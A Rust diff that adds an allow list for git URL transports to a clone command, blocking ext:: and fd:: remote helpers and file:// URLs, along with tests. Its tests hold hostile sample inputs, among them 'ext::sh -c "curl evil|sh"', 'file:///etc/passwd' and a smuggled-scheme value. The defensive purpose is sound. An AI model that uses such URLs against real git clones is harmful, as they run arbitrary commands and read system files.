@@ -20,6 +20,10 @@ pub enum RepoUrlError {
     Empty,
     /// The input does not look like a repository URL (no path component).
     Invalid,
+    /// The input uses a transport usagi does not allow — a remote helper
+    /// (`ext::`, `fd::`, …) or a non-allow-listed scheme (`file://`, …). See
+    /// [`ALLOWED_URL_SCHEMES`].
+    UnsupportedTransport,
 }
 
 impl fmt::Display for RepoUrlError {
@@ -27,6 +31,9 @@ impl fmt::Display for RepoUrlError {
         match self {
             RepoUrlError::Empty => write!(f, "enter a repository URL"),
             RepoUrlError::Invalid => write!(f, "that does not look like a repository URL"),
+            RepoUrlError::UnsupportedTransport => {
+                write!(f, "unsupported URL transport (use https, ssh, or git)")
+            }
         }
     }
 }
@@ -40,10 +47,22 @@ impl RepoUrl {
     /// - HTTPS: `https://github.com/owner/repo.git`
     /// - SSH (scp-like): `git@github.com:owner/repo.git`
     /// - SSH (URL): `ssh://git@host/owner/repo.git`
+    ///
+    /// Rejects transports that can run commands or read arbitrary files — git
+    /// remote helpers (`ext::`, `fd::`, …) and non-allow-listed schemes
+    /// (`file://`, …) — so a hostile URL cannot turn a clone into code execution.
     pub fn parse(input: &str) -> Result<Self, RepoUrlError> {
         let trimmed = input.trim();
         if trimmed.is_empty() {
             return Err(RepoUrlError::Empty);
+        }
+        // Reject dangerous git transports before anything else: `git clone`
+        // treats `ext::sh -c …` as a remote helper that runs an arbitrary
+        // command (remote code execution), and `usagi init <url>` is a
+        // scriptable, agent-reachable entry point. Only the allow-listed
+        // transports may reach `git clone`.
+        if !transport_is_allowed(trimmed) {
+            return Err(RepoUrlError::UnsupportedTransport);
         }
         // A real URL has a host/path separator and a non-empty final segment.
         let has_separator = trimmed.contains('/') || trimmed.contains(':');
@@ -64,6 +83,47 @@ impl RepoUrl {
     pub fn directory_name(&self) -> String {
         // Guaranteed to be Some because `parse` rejected URLs without one.
         final_segment(&self.raw).unwrap_or_default()
+    }
+}
+
+/// URL schemes usagi will hand to `git clone`. The list deliberately excludes
+/// `file://` (and every other scheme) so only network transports a clone dialog
+/// expects are accepted; remote-helper forms (`ext::`, `fd::`, …) carry no
+/// `://` and are caught separately by [`has_remote_helper_prefix`].
+const ALLOWED_URL_SCHEMES: &[&str] = &["https", "http", "ssh", "git"];
+
+/// Whether `url`'s git transport is one usagi allows.
+///
+/// Three shapes reach here:
+/// - `scheme://…` — the scheme must be in [`ALLOWED_URL_SCHEMES`].
+/// - `<transport>::<address>` — a git remote helper (`ext`, `fd`, …); always
+///   rejected, since `ext::sh -c …` is arbitrary command execution.
+/// - `[user@]host:path` (scp-like SSH) or a bare local path — no helper and no
+///   scheme, so it is allowed.
+fn transport_is_allowed(url: &str) -> bool {
+    if let Some((scheme, _)) = url.split_once("://") {
+        is_scheme_token(scheme)
+            && ALLOWED_URL_SCHEMES.contains(&scheme.to_ascii_lowercase().as_str())
+    } else {
+        !has_remote_helper_prefix(url)
+    }
+}
+
+/// Whether `s` is a clean URL-scheme token (`https`, `git`, …): a leading letter
+/// then letters/digits/`+`/`-`/`.` only. A crafted `ext::…://…` fails this (the
+/// `:` is not allowed) so it cannot smuggle an allow-listed scheme.
+fn is_scheme_token(s: &str) -> bool {
+    let mut chars = s.chars();
+    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic())
+        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
+}
+
+/// Whether `s` begins with a `<transport>::` remote-helper prefix. scp-like
+/// SSH URLs use a single colon (`host:path`), so they are not matched.
+fn has_remote_helper_prefix(s: &str) -> bool {
+    match s.find("::") {
+        Some(idx) => is_scheme_token(&s[..idx]),
+        None => false,
     }
 }
 
@@ -152,6 +212,62 @@ mod tests {
     #[test]
     fn rejects_input_without_path() {
         assert_eq!(RepoUrl::parse("notaurl"), Err(RepoUrlError::Invalid));
+    }
+
+    #[test]
+    fn rejects_remote_helper_transports_that_run_commands() {
+        // `git clone "ext::sh -c <cmd>"` invokes the ext remote helper, which
+        // runs an arbitrary command — remote code execution. These (and any
+        // other `<transport>::<address>` helper) must be rejected outright.
+        for url in [
+            "ext::sh -c touch /tmp/pwned",
+            "ext::sh -c \"curl evil|sh\"",
+            "fd::17/foo",
+            // A scheme smuggled after a helper prefix must not slip through.
+            "ext::https://github.com/owner/repo.git",
+        ] {
+            assert_eq!(
+                RepoUrl::parse(url),
+                Err(RepoUrlError::UnsupportedTransport),
+                "should reject {url:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_non_allowlisted_url_schemes() {
+        for url in ["file:///etc/passwd", "ftp://host/repo.git"] {
+            assert_eq!(
+                RepoUrl::parse(url),
+                Err(RepoUrlError::UnsupportedTransport),
+                "should reject {url:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn allows_the_expected_transports() {
+        // The shapes a clone dialog expects all pass: HTTPS/HTTP/git URLs, SSH
+        // URLs, scp-like SSH, and a bare local path (used by tests and local
+        // clones — git's implicit file transport, not a `file://` URL).
+        for url in [
+            "https://github.com/owner/repo.git",
+            "http://host/owner/repo.git",
+            "git://host/owner/repo.git",
+            "ssh://git@host.example/owner/repo.git",
+            "git@github.com:owner/repo.git",
+            "/tmp/local/src",
+        ] {
+            assert!(RepoUrl::parse(url).is_ok(), "should accept {url:?}");
+        }
+    }
+
+    #[test]
+    fn unsupported_transport_message_is_human_readable() {
+        assert_eq!(
+            RepoUrlError::UnsupportedTransport.to_string(),
+            "unsupported URL transport (use https, ssh, or git)"
+        );
     }
 
     #[test]
